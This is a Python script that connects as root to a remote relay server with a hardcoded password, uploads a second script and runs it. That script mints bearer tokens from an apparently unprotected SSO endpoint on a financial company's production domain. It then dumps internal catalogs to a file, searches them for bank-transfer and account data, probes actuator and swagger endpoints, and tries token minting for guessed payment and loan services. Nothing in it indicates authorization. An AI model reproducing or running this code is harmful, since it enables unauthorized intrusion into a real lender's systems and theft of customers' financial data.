import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA, "Content-Type": "application/json"})

# 1. Mint token for catalogs-service
sys.stdout.write("=== MINT TOKEN ===\n")
r = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
    json={"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": "catalogs-service"},
    timeout=10)
tok = r.json().get("token","")
sys.stdout.write(f"Token: {tok[:60]}...\n\n")

# 2. Get catalog index
sys.stdout.write("=== CATALOG INDEX ===\n")
r = s.get("https://catalogs-service.tysonprod.com/v1/catalogs",
    headers={"Authorization": f"Bearer {tok}"}, timeout=10)
catalogs = r.json()
sys.stdout.write(f"Total catalogs: {len(catalogs)}\n")
sys.stdout.write(f"All: {json.dumps(catalogs, indent=2)}\n\n")

# 3. Dump each catalog
sys.stdout.write("=== DUMPING ALL CATALOGS ===\n\n")
all_data = {}
for cat in catalogs:
    try:
        r = s.get(f"https://catalogs-service.tysonprod.com/v1/catalogs/{cat}",
            headers={"Authorization": f"Bearer {tok}"}, timeout=10)
        data = r.json() if r.status_code == 200 else r.text
        all_data[cat] = data
        count = len(data) if isinstance(data, list) else "N/A"
        sys.stdout.write(f"  [{r.status_code}] {cat}: {count} items\n")
        if isinstance(data, list) and len(data) > 0:
            sys.stdout.write(f"    Sample: {json.dumps(data[0])[:300]}\n")
        elif isinstance(data, dict):
            sys.stdout.write(f"    Keys: {list(data.keys())[:10]}\n")
    except Exception as e:
        sys.stdout.write(f"  ERR {cat}: {e}\n")
    sys.stdout.flush()

# Save full dump
with open("/root/catalogs_dump.json", "w") as f:
    json.dump(all_data, f, indent=2, ensure_ascii=False)
sys.stdout.write(f"\nSaved to /root/catalogs_dump.json ({len(json.dumps(all_data))} bytes)\n")

# 4. Look for SPEI/STP/certificate related catalogs
sys.stdout.write("\n=== SPEI/STP/CERT SEARCH ===\n")
for cat, data in all_data.items():
    if isinstance(data, (list, dict)):
        txt = json.dumps(data).lower()
        if any(k in txt for k in ["spei", "stp", "certificado", "clabe", "transferencia", "banco", "cuenta"]):
            sys.stdout.write(f"  HIT: {cat}\n")
            if isinstance(data, list):
                sys.stdout.write(f"    First 3: {json.dumps(data[:3], ensure_ascii=False)[:500]}\n")

# 5. Try other service endpoints with the token
sys.stdout.write("\n=== OTHER SERVICES ===\n")

# Mint for orchestrator
r = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
    json={"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": "orchestrator-gestiona-service-v2"},
    timeout=10)
tok2 = r.json().get("token","")

orch_paths = [
    "/v1/", "/v2/", "/api/",
    "/v1/accounts", "/v1/clients", "/v1/loans",
    "/v1/credits", "/v1/payments", "/v1/collections",
    "/v1/gestiona", "/v1/management",
    "/v1/health", "/v1/info", "/v1/swagger-ui/",
    "/v1/api-docs", "/swagger-ui.html", "/swagger-ui/index.html",
    "/v2/api-docs", "/actuator", "/actuator/health",
    "/actuator/info", "/actuator/env", "/actuator/mappings",
]

for p in orch_paths:
    try:
        r = s.get(f"https://orchestrator-gestiona-service-v2.tysonprod.com{p}",
            headers={"Authorization": f"Bearer {tok2}"}, timeout=5, allow_redirects=False)
        if r.status_code not in [404, 301] or (r.status_code == 200):
            sys.stdout.write(f"  [{r.status_code}] orch {p} ({len(r.text)}b)\n")
            if r.status_code == 200 and len(r.text) > 20:
                sys.stdout.write(f"    {r.text[:500]}\n")
    except:
        pass
    sys.stdout.flush()

# Mint for multimedia
r = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
    json={"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": "multimedia-findep-service"},
    timeout=10)
tok3 = r.json().get("token","")

mm_paths = [
    "/v1/", "/v1/files", "/v1/upload", "/v1/documents",
    "/v1/images", "/v1/multimedia", "/api/",
    "/swagger-ui.html", "/swagger-ui/index.html",
    "/v2/api-docs", "/actuator", "/actuator/health",
    "/actuator/info", "/actuator/env",
]

for p in mm_paths:
    try:
        r = s.get(f"https://multimedia-findep-service.tysonprod.com{p}",
            headers={"Authorization": f"Bearer {tok3}"}, timeout=5, allow_redirects=False)
        if r.status_code not in [404] or (r.status_code == 200):
            sys.stdout.write(f"  [{r.status_code}] multimedia {p} ({len(r.text)}b)\n")
            if r.status_code == 200 and len(r.text) > 20:
                sys.stdout.write(f"    {r.text[:500]}\n")
    except:
        pass
    sys.stdout.flush()

# 6. Try minting tokens for new service names
sys.stdout.write("\n=== MINT FOR MORE SERVICES ===\n")
new_services = [
    "spei-service", "stp-service", "payment-service", "transfer-service",
    "account-service", "credit-service", "loan-service", "core-service",
    "customer-service", "client-service", "notification-service",
    "identity-service", "auth-service", "user-service",
    "origination-service", "bff-origination-service",
    "collections-service", "disbursement-service",
]

for svc in new_services:
    try:
        r = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
            json={"appJwt": "TYSON-COBRANZA-GESTIONA", "serviceName": svc},
            timeout=5)
        if r.status_code == 200:
            data = r.json()
            t = data.get("token","")
            if t:
                sys.stdout.write(f"  OK {svc}: token minted\n")
                # Try the service directly
                try:
                    r2 = s.get(f"https://{svc}.tysonprod.com/",
                        headers={"Authorization": f"Bearer {t}"}, timeout=3, allow_redirects=False)
                    sys.stdout.write(f"    -> [{r2.status_code}] {svc}.tysonprod.com ({len(r2.text)}b)\n")
                    if r2.status_code == 200 and len(r2.text) > 20:
                        sys.stdout.write(f"    BODY: {r2.text[:300]}\n")
                except:
                    pass
        else:
            sys.stdout.write(f"  [{r.status_code}] {svc}: {r.text[:100]}\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/catalogs_dump.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/catalogs_dump.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
